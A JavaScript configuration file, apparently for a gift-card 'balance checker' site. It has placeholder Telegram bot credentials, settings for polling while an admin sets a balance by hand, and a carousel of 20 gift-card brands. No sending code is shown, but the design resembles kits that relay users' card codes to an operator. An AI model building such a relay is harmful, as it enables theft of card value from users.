// ============================================================
//  CONFIGURATION — set your Telegram credentials here
//  (or load from server-side .env via a backend proxy)
// ============================================================

const CONFIG = {
  // Paste your Telegram Bot Token here
  TELEGRAM_BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',

  // Paste your Telegram Chat ID here (e.g. '123456789')
  TELEGRAM_CHAT_ID: 'YOUR_CHAT_ID_HERE',

  // How long (ms) to wait for admin to set balance via admin panel
  // before showing "timeout" message to user
  POLL_TIMEOUT_MS: 5 * 60 * 1000,   // 5 minutes

  // How often to poll for the balance answer (ms)
  POLL_INTERVAL_MS: 3000,
};

// ── Top carousel (20 cards) — paths match files in public/images/ ─────────────
const CAROUSEL_CARDS = [
  // First slide (6 across): iTunes, Razer, PUBG, STC, Mobily, Lebara; then 14 more (carousel uses 6 per page)
  { slug: 'itunes',      label: 'iTunes',        img: 'public/images/itunes_new.avif' },
  { slug: 'razer',       label: 'Razer Gold',    img: 'public/images/razer_recent.avif' },
  { slug: 'pubg',        label: 'PUBG',         img: 'public/images/pubg.avif' },
  { slug: 'stc',         label: 'STC',          img: 'public/images/stc.avif' },
  { slug: 'mobily',      label: 'Mobily',       img: 'public/images/mobily.avif' },
  { slug: 'lebara',      label: 'Lebara',       img: 'public/images/lebara_brand.avif' },
  { slug: 'du',          label: 'du',            img: 'public/images/du.avif' },
  { slug: 'freefire',    label: 'Free Fire',    img: 'public/images/freefire.avif' },
  { slug: 'friendi',     label: 'Friendi',      img: 'public/images/friendi.avif' },
  { slug: 'gamestop',    label: 'GameStop',     img: 'public/images/game_stop.avif' },
  { slug: 'googleplay',  label: 'Google Play',  img: 'public/images/google_play_brand_v2.png' },
  { slug: 'netflix',     label: 'Netflix',     img: 'public/images/netflix_brand.avif' },
  { slug: 'nintendo',    label: 'Nintendo',     img: 'public/images/nintendo.avif' },
  { slug: 'omantel',     label: 'Omantel',      img: 'public/images/omantel%20brand.jpeg' },
  { slug: 'playstation', label: 'PlayStation',  img: 'public/images/playstation.avif' },
  { slug: 'riot',        label: 'Riot Games',   img: 'public/images/riot_games.avif' },
  { slug: 'roblox',      label: 'Roblox',       img: 'public/images/roblox.avif' },
  { slug: 'steam',       label: 'Steam',        img: 'public/images/steam.avif' },
  { slug: 'itunes_jpg',  label: 'iTunes (JPEG)',  img: 'public/images/itunes.jpeg' },
  { slug: 'xbox',        label: 'Xbox',         img: 'public/images/xbox.avif' },
];
